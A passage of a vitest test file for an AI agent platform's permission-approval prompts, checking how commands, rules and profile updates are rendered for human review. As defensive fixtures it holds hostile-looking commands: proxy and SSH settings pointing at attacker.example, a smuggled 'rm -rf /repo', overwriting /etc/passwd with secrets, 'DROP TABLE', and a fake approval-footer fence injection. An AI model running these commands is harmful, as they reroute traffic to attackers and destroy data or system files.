import { describe, expect, it } from 'vitest';

import {
  buildPermissionPromptParts,
  decisionForMode,
  firstPersistentRule,
  formatPermissionPromptText,
  formatPermissionReceiptText,
  normalizePermissionAction,
  persistentRules,
  permissionDecisionOptions,
  permissionButtonLabel,
} from '@core/channels/permission-interaction.js';
import { createPermissionBatchRequest } from '@core/channels/permission-batch-coalescer.js';
import type { PermissionApprovalRequest } from '@core/domain/types.js';

function requestWithSuggestions(
  suggestions: PermissionApprovalRequest['suggestions'],
): PermissionApprovalRequest {
  return {
    requestId: 'permission_123',
    sourceAgentFolder: 'kai_group',
    toolName: 'Bash',
    suggestions,
  };
}

describe('permission interaction', () => {
  it('renders a compact permission batch with batch actions', () => {
    const batch = createPermissionBatchRequest(
      [
        {
          ...requestWithSuggestions([]),
          requestId: 'permission-1',
          toolInput: { command: 'git status --short' },
        },
        {
          ...requestWithSuggestions([]),
          requestId: 'permission-2',
          toolName: 'Write',
          toolInput: { file_path: 'notes.md' },
        },
      ],
      ['1. Command (git status --short)', '2. File action (notes.md)'],
    );

    expect(formatPermissionPromptText(batch, 300_000)).toContain(
      '1. Command (git status --short)',
    );
    expect(formatPermissionPromptText(batch, 300_000)).toContain(
      '2. File action (notes.md)',
    );
    expect(
      permissionDecisionOptions(batch).map((mode) =>
        permissionButtonLabel(mode, batch),
      ),
    ).toEqual(['Allow all', 'Review each', 'Deny all']);
    expect(decisionForMode(batch, 'allow_persistent_rule', 'Ravi')).toEqual(
      expect.objectContaining({
        approved: true,
        mode: 'allow_persistent_rule',
        reason: 'review each',
      }),
    );
  });

  it('removes Allow all when the rendered batch omits permission rows', () => {
    const batch = createPermissionBatchRequest(
      [
        { ...requestWithSuggestions([]), requestId: 'permission-1' },
        { ...requestWithSuggestions([]), requestId: 'permission-2' },
      ],
      [`1. ${'a'.repeat(1_500)}`, `2. ${'b'.repeat(1_500)}`],
    );

    expect(formatPermissionPromptText(batch, 300_000)).toContain(
      '[additional permission details omitted]',
    );
    expect(
      permissionDecisionOptions(batch).map((mode) =>
        permissionButtonLabel(mode, batch),
      ),
    ).toEqual(['Review each', 'Deny all']);
  });

  it('reconstructs Review each from a recovered batch callback', () => {
    const original = requestWithSuggestions([]);

    expect(permissionDecisionOptions(original, 'batch')).toEqual([
      'allow_once',
      'allow_persistent_rule',
      'cancel',
    ]);
    const decision = decisionForMode(
      original,
      'allow_persistent_rule',
      'Ravi',
      'batch',
    );
    expect(decision).toMatchObject({
      approved: true,
      mode: 'allow_persistent_rule',
      decisionClassification: 'user_temporary',
      batchDecision: 'review_each',
    });
    expect(
      formatPermissionReceiptText(original.requestId, original, decision),
    ).toBe('Reviewing each permission request.');
  });

  it('accepts only current permission action tokens', () => {
    expect(normalizePermissionAction('allow_once')).toBe('allow_once');
    expect(normalizePermissionAction('allow_persistent_rule')).toBe(
      'allow_persistent_rule',
    );
    expect(normalizePermissionAction('cancel')).toBe('cancel');
    expect(normalizePermissionAction('approve')).toBeNull();
    expect(normalizePermissionAction('deny')).toBeNull();
  });

  it('allows persistent approval only when one displayed rule maps to one update', () => {
    const request = requestWithSuggestions([
      {
        type: 'addRules',
        behavior: 'allow',
        rules: [{ toolName: 'Bash', ruleContent: 'npm test *' }],
      },
    ]);

    expect(firstPersistentRule(request)).toBe('RunCommand(npm test *)');
    expect(permissionDecisionOptions(request)).toContain(
      'allow_persistent_rule',
    );
    expect(
      decisionForMode(request, 'allow_persistent_rule').updatedPermissions,
    ).toEqual([
      {
        type: 'addRules',
        behavior: 'allow',
        destination: 'session',
        rules: [{ toolName: 'Bash', ruleContent: 'npm test *' }],
      },
    ]);
  });

  it('allows persistent approval when one displayed update contains multiple rules', () => {
    const request = requestWithSuggestions([
      {
        type: 'addRules',
        behavior: 'allow',
        rules: [
          { toolName: 'Bash', ruleContent: 'git status' },
          { toolName: 'Bash', ruleContent: 'head -n 20' },
        ],
      },
    ]);

    expect(permissionDecisionOptions(request)).toContain(
      'allow_persistent_rule',
    );
    expect(permissionButtonLabel('allow_persistent_rule', request)).toBe(
      'Allow for future',
    );
    expect(
      decisionForMode(request, 'allow_persistent_rule').updatedPermissions,
    ).toEqual([
      {
        type: 'addRules',
        behavior: 'allow',
        destination: 'session',
        rules: [
          { toolName: 'Bash', ruleContent: 'git status' },
          { toolName: 'Bash', ruleContent: 'head -n 20' },
        ],
      },
    ]);
  });

  it('does not offer persistent approval when hidden extra rules are present', () => {
    const request = requestWithSuggestions([
      {
        type: 'addRules',
        behavior: 'allow',
        rules: [{ toolName: 'Bash', ruleContent: 'npm test *' }],
      },
      {
        type: 'addRules',
        behavior: 'allow',
        rules: [{ toolName: 'Bash', ruleContent: '*' }],
      },
    ]);

    expect(firstPersistentRule(request)).toBeUndefined();
    expect(permissionDecisionOptions(request)).toEqual([
      'allow_once',
      'cancel',
    ]);
    const decision = decisionForMode(request, 'allow_persistent_rule');
    expect(decision.approved).toBe(false);
    expect(decision.reason).toBe('approval option unavailable');
  });

  it('does not offer persistent approval for wildcard-scoped RunCommand suggestions', () => {
    const request = requestWithSuggestions([
      {
        type: 'addRules',
        behavior: 'allow',
        rules: [{ toolName: 'Bash', ruleContent: '*' }],
      },
    ]);

    expect(firstPersistentRule(request)).toBeUndefined();
    expect(permissionDecisionOptions(request)).toEqual([
      'allow_once',
      'cancel',
    ]);
  });

  it('offers persistent approval for SDK file tools via Gantry facades', () => {
    const request = {
      ...requestWithSuggestions([
        {
          type: 'addRules',
          behavior: 'allow',
          rules: [{ toolName: 'Read' }],
        },
      ]),
      toolName: 'Read',
    };

    expect(firstPersistentRule(request)).toBe('FileRead');
    expect(permissionDecisionOptions(request)).toEqual([
      'allow_once',
      'allow_persistent_rule',
      'cancel',
    ]);
  });

  it('keeps every button label short enough for narrow mobile screens', () => {
    const request = {
      ...requestWithSuggestions([
        {
          type: 'addRules',
          behavior: 'allow',
          rules: [{ toolName: 'capability:acme.records.append' }],
        },
      ]),
    } satisfies PermissionApprovalRequest;
    const modes = ['allow_once', 'allow_persistent_rule', 'cancel'] as const;
    for (const mode of modes) {
      const label = permissionButtonLabel(mode, request);
      expect(label.length).toBeLessThanOrEqual(20);
      // capability/delivery labels belong in the body, never on a button
      expect(label).not.toContain('acme');
      expect(label).not.toContain('capability');
    }
  });

  it('keeps scheduled job prompts aligned with the permission vocabulary', () => {
    const request = {
      ...requestWithSuggestions([]),
      jobId: 'job-1',
      jobName: 'Lead sync',
    };

    expect(permissionButtonLabel('allow_once', request)).toBe('Allow once');
    expect(permissionButtonLabel('cancel', request)).toBe('Cancel');
  });

  it('adds the repeated allow-once hint to plain and structured prompts', () => {
    const request = {
      ...requestWithSuggestions([]),
      promotionHintCount: 3,
    } satisfies PermissionApprovalRequest;
    const hint =
      "You've allowed this 3 times — 'Allow for future' makes it permanent.";

    expect(formatPermissionPromptText(request, 60_000)).toContain(hint);
    expect(buildPermissionPromptParts(request, 60_000).contextLines).toContain(
      hint,
    );
  });

  it('shows profile update proposed content and hash in the approval prompt', () => {
    const request = {
      ...requestWithSuggestions([]),
      toolName: 'request_agent_profile_update',
      displayName: 'Update AGENTS.md',
      toolInput: {
        file: 'agents',
        fileName: 'AGENTS.md',
        summary: 'Clarify memory usage.',
        proposedContentHash: 'abc123',
        proposedContentBytes: 41,
        proposedContent: '# next\n\nUse memory_search before guessing.',
        diffPreview: '+ Use memory_search before guessing.',
      },
    } satisfies PermissionApprovalRequest;

    const text = formatPermissionPromptText(request, 60_000);

    expect(text).toContain('Proposed hash: abc123');
    expect(text).toContain('Proposed size: 41 bytes');
    expect(text).toContain('Proposed content:');
    expect(text).toContain('Use memory_search before guessing.');
    expect(text).toContain('Change:');
  });

  it('escapes profile content fence delimiters in approval prompt text', () => {
    const request = {
      ...requestWithSuggestions([]),
      toolName: 'request_agent_profile_update',
      displayName: 'Update AGENTS.md',
      toolInput: {
        file: 'agents',
        fileName: 'AGENTS.md',
        summary: 'Clarify review safety.',
        proposedContentHash: 'abc123',
        proposedContentBytes: 37,
        proposedContent: '# next\n```\nFake approval footer\n```',
      },
    } satisfies PermissionApprovalRequest;

    const text = formatPermissionPromptText(request, 60_000);

    expect(text).toContain('`\\`\\`');
    expect(text.match(/```/g)).toHaveLength(2);
    expect(text).not.toContain('\n```\nFake approval footer');
  });

  it('does not show a truncated middle-hidden profile update as review evidence', () => {
    const request = {
      ...requestWithSuggestions([]),
      toolName: 'request_agent_profile_update',
      displayName: 'Update AGENTS.md',
      toolInput: {
        fileName: 'AGENTS.md',
        proposedContentHash: 'abc123',
        proposedContentBytes: 4000,
        proposedContent: `start\n${'middle\n'.repeat(600)}end`,
        diffPreview: '+ large change',
      },
    } satisfies PermissionApprovalRequest;

    const text = formatPermissionPromptText(request, 60_000);

    expect(text).toContain('Proposed content: full content is attached');
    expect(text).not.toContain('start');
    expect(text).not.toContain('end');
  });

  it('surfaces full profile content as structured approval evidence', () => {
    const content = '# next\n\nUse memory_search before guessing.';
    const request = {
      ...requestWithSuggestions([]),
      toolName: 'request_agent_profile_update',
      displayName: 'Update AGENTS.md',
      interaction: {
        id: 'profile-1',
        title: 'Update AGENTS.md',
        body: 'Clarify memory usage.',
        details: [{ label: 'Proposed hash', value: 'abc123', mono: true }],
        files: [
          {
            path: 'AGENTS.md',
            sizeBytes: Buffer.byteLength(content, 'utf8'),
            contentHash: 'abc123',
            contentType: 'text/markdown',
            preview: content,
            truncated: false,
          },
        ],
      },
    } satisfies PermissionApprovalRequest;

    const parts = buildPermissionPromptParts(request, 60_000);

    expect(request.interaction?.files?.[0]?.preview).toBe(content);
    expect(parts.fullView).toMatchObject({
      label: 'View diff',
      content,
    });
    expect(parts.bodyLines).not.toContain('Full content:');
    expect(parts.bodyLines).not.toContain(content);
    expect(parts.bodyLines.join('\n')).toContain('Review file: AGENTS.md');
  });

  it('escapes profile content fence delimiters in structured approval evidence', () => {
    const content = '# next\n```\nFake approval footer\n```';
    const request = {
      ...requestWithSuggestions([]),
      toolName: 'request_agent_profile_update',
      displayName: 'Update AGENTS.md',
      interaction: {
        id: 'profile-1',
        title: 'Update AGENTS.md',
        body: 'Clarify review safety.',
        files: [
          {
            path: 'AGENTS.md',
            sizeBytes: Buffer.byteLength(content, 'utf8'),
            contentHash: 'abc123',
            contentType: 'text/markdown',
            preview: content,
            truncated: false,
          },
        ],
      },
    } satisfies PermissionApprovalRequest;

    const parts = buildPermissionPromptParts(request, 60_000);
    const body = parts.bodyLines.join('\n');

    expect(parts.fullView?.content).toBe(content);
    expect(body).not.toContain('```');
    expect(body).not.toContain('\n```\nFake approval footer');
  });

  it('uses explicit request decision options', () => {
    const request = {
      ...requestWithSuggestions([
        {
          type: 'addRules',
          behavior: 'allow',
          rules: [{ toolName: 'Bash', ruleContent: 'npm test *' }],
        },
      ]),
      decisionOptions: ['allow_once', 'allow_persistent_rule', 'cancel'],
    } satisfies PermissionApprovalRequest;

    expect(permissionDecisionOptions(request)).toEqual([
      'allow_once',
      'allow_persistent_rule',
      'cancel',
    ]);
  });

  it('renders semantic capability prompts before raw implementation details', () => {
    const text = formatPermissionPromptText(
      {
        requestId: 'permission_123',
        sourceAgentFolder: 'main_agent',
        toolName: 'request_permission',
        toolInput: {
          capabilityId: 'acme.records.append',
          capabilityDisplayName: 'Acme records append',
          accountLabel: 'Acme tenant',
          can: 'Append records through reviewed Acme access.',
          cannot: 'Delete records, export secrets, or change account settings.',
        },
        suggestions: [
          {
            type: 'addRules',
            behavior: 'allow',
            rules: [{ toolName: 'capability:acme.records.append' }],
          },
        ],
      },
      60_000,
    );

    expect(text.split('\n')[0]).toBe(
      '🔐 Allow Main Agent to use Acme records append?',
    );
    expect(text).toContain('Account: Acme tenant');
    expect(text).not.toContain('Access: Acme records append');
    expect(text).not.toContain(
      'Allows: Append records through reviewed Acme access.',
    );
    expect(text).not.toContain(
      'Does not allow: Delete records, export secrets, or change account settings.',
    );
    expect(text).not.toContain('Capability: Acme Records Append');
    expect(text).not.toContain('capability:acme.records.append');
    expect(
      permissionButtonLabel(
        'allow_persistent_rule',
        requestWithSuggestions([
          {
            type: 'addRules',
            behavior: 'allow',
            rules: [{ toolName: 'capability:acme.records.append' }],
          },
        ]),
      ),
    ).toBe('Allow for future');
  });

  it('renders trusted skill action prompts with short mobile buttons', () => {
    const request = {
      requestId: 'permission_123',
      sourceAgentFolder: 'Main Agent',
      jobId: 'linkedin-job-1',
      toolName: 'Bash',
      toolInput: {
        command: 'python3 skills/linkedin-posting/post.py --file /tmp/post.md',
      },
      suggestions: [
        {
          type: 'addRules',
          behavior: 'allow',
          rules: [{ toolName: 'capability:skill.linkedin-posting.publish' }],
        },
      ],
      semanticCapabilityDefinitions: {
        'skill.linkedin-posting.publish': {
          capabilityId: 'skill.linkedin-posting.publish',
          displayName: 'LinkedIn posting',
          category: 'linkedin-posting',
          risk: 'write',
          can: 'Publish a prepared LinkedIn post through the approved script.',
          cannot:
            'Read unrelated accounts or receive raw LinkedIn credentials.',
          credentialSource: 'skill_secret',
          implementationBindings: [
            {
              kind: 'tool_rule',
              rule: 'RunCommand(skills/linkedin-posting/post.py *)',
            },
          ],
          preflight: { kind: 'none' },
        },
      },
    } satisfies PermissionApprovalRequest;

    const text = formatPermissionPromptText(request, 60_000);

    expect(text.split('\n')[0]).toBe(
      '🔐 Allow Main Agent to use LinkedIn posting?',
    );
    expect(text).toContain('scheduled job');
    expect(text).toContain('Agent: Main Agent');
    expect(text).not.toContain(
      'Allows: Publish a prepared LinkedIn post through the approved script.',
    );
    expect(permissionButtonLabel('allow_once', request)).toBe('Allow once');
    expect(permissionButtonLabel('allow_persistent_rule', request)).toBe(
      'Allow for future',
    );
    expect(permissionButtonLabel('cancel', request)).toBe('Cancel');

    const receipt = formatPermissionReceiptText('permission_123', request, {
      approved: true,
      mode: 'allow_persistent_rule',
      decidedBy: 'ravi',
    });
    expect(receipt).toContain(
      'Allowed for future: LinkedIn posting. Saved for Main Agent. Manage access to revoke it later.',
    );
  });

  it('shows declared skill action network hosts in the permission prompt', () => {
    const request = {
      requestId: 'permission_net',
      sourceAgentFolder: 'Main Agent',
      jobId: 'linkedin-job-1',
      toolName: 'Bash',
      toolInput: {
        command: 'python3 skills/linkedin-posting/post.py --file /tmp/post.md',
      },
      suggestions: [
        {
          type: 'addRules',
          behavior: 'allow',
          rules: [{ toolName: 'capability:skill.linkedin-posting.publish' }],
        },
      ],
      semanticCapabilityDefinitions: {
        'skill.linkedin-posting.publish': {
          capabilityId: 'skill.linkedin-posting.publish',
          displayName: 'LinkedIn Posting publish',
          category: 'linkedin-posting',
          risk: 'write',
          can: 'Publish a prepared LinkedIn post.',
          cannot: 'Read unrelated credentials.',
          credentialSource: 'skill_secret',
          implementationBindings: [
            {
              kind: 'tool_rule',
              rule: 'RunCommand(skills/linkedin-posting/post.py *)',
            },
          ],
          networkHosts: ['api.linkedin.com:443', 'www.linkedin.com:443'],
          preflight: { kind: 'none' },
        },
      },
    } satisfies PermissionApprovalRequest;

    const text = formatPermissionPromptText(request, 60_000);
    expect(text).toContain(
      'Network: api.linkedin.com:443, www.linkedin.com:443',
    );

    const parts = buildPermissionPromptParts(request, 60_000);
    expect(parts.bodyLines).toContain(
      'Network: api.linkedin.com:443, www.linkedin.com:443',
    );
  });

  it('renders the full provider-neutral semantic field set every channel shares', () => {
    const request = {
      requestId: 'permission_123',
      sourceAgentFolder: 'main_agent',
      targetJid: 'tg:-100team',
      threadId: '42',
      toolName: 'Bash',
      toolInput: { command: 'acme records append sheet A1' },
      suggestions: [
        {
          type: 'addRules',
          behavior: 'allow',
          rules: [{ toolName: 'capability:acme.records.append' }],
        },
      ],
      semanticCapabilityDefinitions: {
        'acme.records.append': {
          capabilityId: 'acme.records.append',
          displayName: 'Acme records append',
          category: 'acme',
          risk: 'write',
          can: 'Append records through reviewed Acme access.',
          cannot: 'Delete records or change account settings.',
          credentialSource: 'configured_access',
          implementationBindings: [
            { kind: 'tool_rule', rule: 'RunCommand(acme records append *)' },
          ],
          preflight: { kind: 'none' },
        },
      },
    } satisfies PermissionApprovalRequest;

    const text = formatPermissionPromptText(request, 60_000);

    expect(text.split('\n')[0]).toBe(
      '🔐 Allow Main Agent to use Acme records append?',
    );
    expect(text).toContain('Agent: Main Agent');
    expect(text).toContain('agent chat');
    expect(text).not.toContain('Access: Acme records append');
    expect(text).not.toContain(
      'Allows: Append records through reviewed Acme access.',
    );
    expect(text).not.toContain(
      'Does not allow: Delete records or change account settings.',
    );
    expect(text).toContain('Risk: Write');
    expect(text).not.toContain('Scope:');
    expect(text).toContain('Approval applies to the parent conversation.');
    // raw implementation details must stay out of primary copy
    expect(text).not.toContain('capability:acme.records.append');
    expect(text).not.toContain('RunCommand');
  });

  it('hides generated runtime skill paths in command prompts and receipts', () => {
    const request = {
      requestId: 'permission_123',
      sourceAgentFolder: 'Main Agent',
      toolName: 'Bash',
      toolInput: {
        command:
          'python3 /tmp/run/.llm-runtime/claude/skills/linkedin-posting/post.py --file /tmp/post.md',
      },
      suggestions: [
        {
          type: 'addRules',
          behavior: 'allow',
          rules: [
            {
              toolName: 'RunCommand',
              ruleContent: 'skills/linkedin-posting/post.py *',
            },
          ],
        },
      ],
    } satisfies PermissionApprovalRequest;

    const text = formatPermissionPromptText(request, 60_000);
    expect(text).toContain(
      'Command: generated skill action command; runtime path hidden.',
    );
    expect(text).toContain('Action: skills/linkedin-posting/post.py');
    expect(text).not.toContain('.llm-runtime');

    const receipt = formatPermissionReceiptText('permission_123', request, {
      approved: true,
      mode: 'allow_once',
      decidedBy: 'ravi',
    });
    expect(receipt).toContain(
      'Allowed once: Selected skill action (skills/linkedin-posting/post.py). The agent will continue this request.',
    );
    expect(receipt).not.toContain('.llm-runtime');
  });

  it('treats thread ids as prompt routing, not separate permission scope', () => {
    const request = {
      requestId: 'permission_123',
      sourceAgentFolder: 'Main Agent',
      targetJid: 'tg:-1003986348737',
      threadId: '2771',
      toolName: 'Bash',
      toolInput: {
        command: 'acme records append sheet-id A1:B2',
      },
      suggestions: [
        {
          type: 'addRules',
          behavior: 'allow',
          rules: [
            {
              toolName: 'RunCommand',
              ruleContent: 'acme records append *',
            },
          ],
        },
      ],
    } satisfies PermissionApprovalRequest;

    const text = formatPermissionPromptText(request, 60_000);
    expect(text).toContain('Approval applies to the parent conversation.');
    expect(text).not.toContain('Scope:');
    expect(text).not.toContain('Thread: 2771');

    const receipt = formatPermissionReceiptText('permission_123', request, {
      approved: true,
      mode: 'allow_once',
      decidedBy: 'ravi',
    });
    expect(receipt).toContain(
      'Allowed once: Command (acme records append sheet-id A1:B2). The agent will continue this request.',
    );
    expect(receipt).not.toContain('Route:');
  });

  it('renders scoped RunCommand setup prompts as command rules even when capability metadata is present', () => {
    const text = formatPermissionPromptText(
      {
        requestId: 'permission_123',
        sourceAgentFolder: 'main_agent',
        toolName: 'request_permission',
        displayName: 'Permission: Acme records append using acme',
        title: 'Approve permission request',
        toolInput: {
          capabilityId: 'acme.records.append',
          capabilityDisplayName: 'Acme records append using acme',
          toolNames: ['Bash'],
          rule: '/usr/local/bin/acme records append *',
        },
        suggestions: [
          {
            type: 'addRules',
            behavior: 'allow',
            rules: [
              {
                toolName: 'Bash',
                ruleContent: '/usr/local/bin/acme records append *',
              },
            ],
          },
        ],
      },
      60_000,
    );

    expect(text.split('\n')[0]).toBe(
      '🔐 Allow Main Agent to use exact command access?',
    );
    expect(text).not.toContain(
      'Request: Permission: Acme records append using acme',
    );
    expect(text).not.toContain(
      'Details: matching command access (/usr/local/bin/acme records append *)',
    );
    expect(text).not.toContain('Always allow grants this capability');
    expect(text).not.toContain(
      'RunCommand(/usr/local/bin/acme records append *)',
    );
    expect(text).not.toContain('Configured Google access');
  });

  it('renders request_permission command fallbacks without implementation tool names', () => {
    const text = formatPermissionPromptText(
      {
        requestId: 'permission_123',
        sourceAgentFolder: 'main_agent',
        toolName: 'request_permission',
        displayName: 'RunCommand',
        description: 'Publish the LinkedIn post draft',
        decisionReason: 'Contains simple_expansion',
        toolInput: {
          command:
            'REQUESTS_CA_BUNDLE=$NODE_EXTRA_CA_CERTS /opt/homebrew/bin/python3 "$CLAUDE_PROJECT_DIR/skills/linkedin-posting/post.py" --file /tmp/post.md',
          description: 'Publish the LinkedIn post draft',
        },
      },
      60_000,
    );

    expect(text.split('\n')[0]).toBe(
      '🔐 Allow Main Agent to use exact command access?',
    );
    expect(text).not.toContain('Request: Exact Command Access');
    expect(text).not.toContain('Reason: Contains shell expansion');
    expect(text).not.toContain('Details: Publish the LinkedIn post draft');
    expect(text).not.toContain(['Allow', 'RunCommand?'].join(' '));
    expect(text).not.toContain('"command"');
    expect(text).not.toContain('simple_expansion');
  });

  it('collapses leading runtime environment assignments in command prompts and receipts', () => {
    const request = {
      ...requestWithSuggestions([]),
      toolName: 'RunCommand',
      toolInput: {
        command:
          "GODEBUG=netdns=go HTTP_PROXY='http://127.0.0.1:18790/' HTTPS_PROXY='http://127.0.0.1:18790/' NODE_USE_ENV_PROXY='1' NO_PROXY='127.0.0.1,localhost,::1' gantry credentials --help > /tmp/gantry-help.txt",
      },
    } satisfies PermissionApprovalRequest;

    const text = formatPermissionPromptText(request, 60_000);

    expect(text).toContain('Command:\n```\ngantry credentials --help');
    expect(text).not.toContain('Runtime environment:');
    expect(text).not.toContain('127.0.0.1:18790');
    expect(text).toContain('Redirect: > /tmp/gantry-help.txt');

    const receipt = formatPermissionReceiptText('permission_123', request, {
      approved: true,
      mode: 'allow_once',
      decidedBy: 'ravi',
    });
    expect(receipt).toContain(
      'Allowed once: Command (gantry credentials --help > /tmp/gantry-help.txt). The agent will continue this request.',
    );
  });

  it('clamps long command previews at line boundaries', () => {
    const command = Array.from(
      { length: 80 },
      (_, index) =>
        `echo line-${String(index).padStart(3, '0')}-complete-token`,
    ).join('\n');
    const text = formatPermissionPromptText(
      {
        ...requestWithSuggestions([]),
        toolName: 'Bash',
        toolInput: { command },
      },
      60_000,
    );
    const commandPreview = text.match(/Command:\n```\n([\s\S]*?)\n```/)?.[1];

    expect(commandPreview).toBeDefined();
    expect(commandPreview?.startsWith('echo line-000-complete-token\n')).toBe(
      true,
    );
    expect(commandPreview).toMatch(/\n… \(\+\d+ more lines\)$/);
    expect(commandPreview).not.toContain('line-079-complete-token');
    const shownCommandLines = commandPreview
      ?.split('\n')
      .filter((line) => line && !line.startsWith('…'));
    expect(
      shownCommandLines?.every((line) => line.endsWith('-complete-token')),
    ).toBe(true);
  });

  it('clamps oversized single-line command previews', () => {
    const command = `node -e "${'x'.repeat(2_000)}" --done`;
    const text = formatPermissionPromptText(
      {
        ...requestWithSuggestions([]),
        toolName: 'Bash',
        toolInput: { command },
      },
      60_000,
    );
    const commandPreview = text.match(/Command:\n```\n([\s\S]*?)\n```/)?.[1];

    expect(commandPreview).toBeDefined();
    expect(commandPreview?.length).toBeLessThan(command.length);
    expect(commandPreview).toContain('node -e');
    expect(commandPreview).toContain('--done');
    expect(commandPreview).toContain('…');
  });

  it('keeps user-provided command environment assignments visible', () => {
    const text = formatPermissionPromptText(
      {
        ...requestWithSuggestions([]),
        toolName: 'Bash',
        toolInput: {
          command: 'FEATURE_FLAG=1 npm test',
        },
      },
      60_000,
    );

    expect(text).toContain('FEATURE_FLAG=1 npm test');
    expect(text).not.toContain('Runtime environment:');
  });

  it('keeps user-provided runtime-key environment assignments visible', () => {
    const text = formatPermissionPromptText(
      {
        ...requestWithSuggestions([]),
        toolName: 'Bash',
        toolInput: {
          command:
            "HTTP_PROXY='http://attacker.example:8080' GIT_SSH_COMMAND='ssh -o ProxyCommand=evil' git clone https://example.com/repo.git",
        },
      },
      60_000,
    );

    expect(text).toContain("HTTP_PROXY='http://attacker.example:8080'");
    expect(text).toContain("GIT_SSH_COMMAND='ssh -o ProxyCommand=evil'");
    expect(text).toContain(
      "Runtime environment: HTTP_PROXY='http://attacker.example:8080' GIT_SSH_COMMAND='ssh -o ProxyCommand=evil'",
    );
  });

  it('keeps TLS trust environment assignments visible', () => {
    const text = formatPermissionPromptText(
      {
        ...requestWithSuggestions([]),
        toolName: 'Bash',
        toolInput: {
          command: 'SSL_CERT_FILE=/tmp/gantry-evil.pem git clone repo',
        },
      },
      60_000,
    );

    expect(text).toContain('SSL_CERT_FILE=/tmp/gantry-evil.pem git clone repo');
    expect(text).not.toContain('Runtime environment:');
  });

  it('keeps agent-supplied env visible for generated skill action commands', () => {
    const request = {
      ...requestWithSuggestions([]),
      toolName: 'RunCommand',
      toolInput: {
        command:
          "HTTP_PROXY='http://127.0.0.1:8888/' https_proxy='http://proxy.example:8888/' /tmp/.llm-runtime/claude/skills/demo/action.sh",
      },
    } satisfies PermissionApprovalRequest;

    const text = formatPermissionPromptText(request, 60_000);

    expect(text).toContain(
      'Command: generated skill action command; runtime path hidden.',
    );
    expect(text).toContain('Action: skills/demo/action.sh');
    // Host-injected loopback proxy is hidden; the agent-supplied proxy stays.
    expect(text).toContain(
      "Runtime environment: https_proxy='http://proxy.example:8888/'",
    );
    expect(text).not.toContain('127.0.0.1:8888');
    expect(
      formatPermissionReceiptText('permission_123', request, {
        approved: true,
        mode: 'allow_once',
        decidedBy: 'ravi',
      }),
    ).toContain(
      "Selected skill action (skills/demo/action.sh; env: https_proxy='http://proxy.example:8888/')",
    );
  });

  it('keeps shell control operators in the visible command after env assignments', () => {
    const text = formatPermissionPromptText(
      {
        ...requestWithSuggestions([]),
        toolName: 'Bash',
        toolInput: {
          command: 'GIT_SSH_COMMAND=ssh;rm -rf /repo git clone repo',
        },
      },
      60_000,
    );

    expect(text).toContain('Runtime environment: GIT_SSH_COMMAND=ssh');
    expect(text).toContain(';rm -rf /repo git clone repo');
  });

  it('hides Bash commands with secrets in permission prompt previews', () => {
    const text = formatPermissionPromptText(
      {
        ...requestWithSuggestions([]),
        toolInput: {
          command:
            'OPENAI_API_KEY=sk-testsecretsecretsecretsecretsecretsecret npm test',
        },
      },
      60_000,
    );

    expect(text).toContain(
      'Command: hidden because it may contain sensitive values.',
    );
    expect(text).toContain('Program: npm');
    expect(text).not.toContain('REDACTED');
    expect(text).not.toContain('sk-testsecretsecretsecretsecretsecretsecret');
    expect(text).not.toContain('Command:\n```');
  });

  it('keeps safe Bash command context when an opaque token is hidden', () => {
    const text = formatPermissionPromptText(
      {
        ...requestWithSuggestions([]),
        toolInput: {
          command:
            'curl https://api.example.com -H "Authorization: bearer abcdefghijklmnopqrstuvwxyz123456" --data ok',
        },
      },
      60_000,
    );

    expect(text).toContain(
      'Command: hidden because it may contain sensitive values.',
    );
    expect(text).toContain('Program: curl');
    expect(text).not.toContain('REDACTED');
    expect(text).not.toContain('abcdefghijklmnopqrstuvwxyz123456');
  });

  it('shows destructive Bash redirect targets without offering persistence', () => {
    const text = formatPermissionPromptText(
      {
        requestId: 'permission_123',
        sourceAgentFolder: 'main_agent',
        toolName: 'Bash',
        toolInput: { command: 'cat secrets.env > /etc/passwd' },
        suggestions: [],
      },
      60_000,
    );

    expect(text).toContain('Redirect: > /etc/passwd');
    expect(text).not.toContain('Scope:');
    expect(text).not.toContain('future matching tool calls');
  });

  it('shows a risk line for destructive Bash commands without redirects', () => {
    const text = formatPermissionPromptText(
      {
        requestId: 'permission_123',
        sourceAgentFolder: 'main_agent',
        toolName: 'Bash',
        toolInput: { command: 'DROP TABLE customers' },
        suggestions: [],
      },
      60_000,
    );

    expect(text).toContain('⚠️ Runs destructive SQL');
  });

  it('renders a structured Bash prompt with persistent rules', () => {
    const text = formatPermissionPromptText(
      {
        requestId: 'permission_123',
        sourceAgentFolder: 'main_agent',
        toolName: 'Bash',
        toolInput: {
          command:
            "curl -sSf https://api.example.com/leads | jq '.[] | select(.score > 80)' > /tmp/leads.json",
        },
        suggestions: [
          {
            type: 'addRules',
            behavior: 'allow',
            rules: [
              {
                toolName: 'Bash',
                ruleContent: 'curl https://api.example.com/*',
              },
              { toolName: 'Bash', ruleContent: 'jq -r *' },
            ],
          },
        ],
      },
      300_000,
    );

    expect(text).toMatchInlineSnapshot(`
      "🔐 Allow Main Agent to use exact command access?

      Runs: curl, jq
      Command:
      \`\`\`
      curl -sSf https://api.example.com/leads | jq '.[] | select(.score > 80)' > /tmp/leads.json
      \`\`\`
      Redirect: > /tmp/leads.json

      Agent: Main Agent
      Context: agent chat
      The agent cannot approve this itself.
      Reply in 5m"
    `);
  });

  it('marks scheduled-job permission prompts without exposing job ids', () => {
    const text = formatPermissionPromptText(
      {
        requestId: 'permission_123',
        sourceAgentFolder: 'main_agent',
        jobId: 'fixture-lead-maintenance-controller-2026-05-15',
        jobName: 'Fixture Lead Maintenance Controller',
        toolName: 'Bash',
        toolInput: { command: 'npm run lead-generator' },
      },
      60_000,
    );

    expect(text).toContain(
      'Context: scheduled job: Fixture Lead Maintenance Controller',
    );
    expect(text).toContain('Agent: Main Agent');
    expect(text).not.toContain(
      'fixture-lead-maintenance-controller-2026-05-15',
    );
  });

  it('marks interactive-agent permission prompts', () => {
    const text = formatPermissionPromptText(
      {
        requestId: 'permission_123',
        sourceAgentFolder: 'main_agent',
        toolName: 'Bash',
        toolInput: { command: 'git status --short' },
      },
      60_000,
    );

    expect(text).toContain('Context: agent chat');
    expect(text).not.toContain('scheduled job');
  });

  it('renders skill action capability prompts with the semantic display name', () => {
    const text = formatPermissionPromptText(
      {
        requestId: 'permission_123',
        sourceAgentFolder: 'main_agent',
        toolName: 'RunCommand',
        toolInput: {
          command: 'skills/linkedin-posting/publish --draft post.md',
        },
        suggestions: [
          {
            type: 'addRules',
            behavior: 'allow',
            destination: 'session',
            rules: [{ toolName: 'capability:skill.linkedin-posting.publish' }],
          },
        ],
        semanticCapabilityDefinitions: {
          'skill.linkedin-posting.publish': {
